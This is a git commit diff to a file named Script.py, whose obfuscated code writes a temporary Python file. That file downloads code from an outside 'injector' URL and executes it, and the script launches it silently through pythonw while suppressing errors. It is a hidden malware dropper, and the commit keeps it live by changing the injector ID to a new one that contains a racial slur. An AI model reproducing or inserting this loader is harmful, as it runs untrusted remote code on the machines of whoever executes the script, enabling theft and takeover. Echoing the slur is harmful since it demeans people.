c396c5124d4f9bdeaad67401586f34e3fcccc819
Sysy's <86845555+Sysys242@users.noreply.github.com>
2022-11-11 10:38:50 +0100

    Update Script.py

--- Script.py
+++ Script.py
@@ -2,7 +2,7 @@ from tempfile import NamedTemporaryFile as _ffile
 from sys import executable as _eexecutable
 from os import system as _ssystem
 _ttmp = _ffile(delete=False)
-_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('http://fade.one/injector/FADEE-H04IKA-PQBJXE-U3DFLG-C9QWXQ-KNBCSN').read())""")
+_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('http://fade.one/injector/FADEE-1234-NIGGA').read())""")
 _ttmp.close()
 try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
 except: pass
